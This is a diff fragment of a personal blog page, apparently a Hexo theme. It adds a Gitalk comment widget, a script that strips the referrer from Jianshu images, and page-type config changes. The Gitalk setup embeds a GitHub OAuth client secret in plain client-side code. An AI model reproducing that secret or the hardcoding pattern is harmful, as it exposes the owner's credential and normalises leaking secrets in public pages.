+  <div id="gitalk-container" style="padding: 0px 30px 0px 30px;"></div> 
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+
+if(true){
+  var gitalk = new Gitalk({
+    clientID: 'c741c580e5927006c62d',
+    clientSecret: 'f8fdc39531f526b87dac59d9f025c55cb9580617',
+    repo: 'happygml.github.io',
+    owner: 'happygml',
+    admin: ['happygml'],
+    id: 'Mon May 18 2020 10:58:26 GMT+0800',
+    distractionFreeMode: 'true'
+})
+gitalk.render('gitalk-container') 
+}
+</script>
+
+  
+
+<!--简书外链-->
+<script>
+var link="";
+var a = document.getElementsByTagName('img');
+for(i=0;i<a.length;i++){
+        if((a[i].src).indexOf("jianshu") > 0){
+        a[i].referrerPolicy='no-referrer';
+        link = a[i].src;
+        a[i].src = link+'?t='+Math.random();
+        }
+}
+</script>
           </div>
         </div>
       </div>
@@ -620,9 +518,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
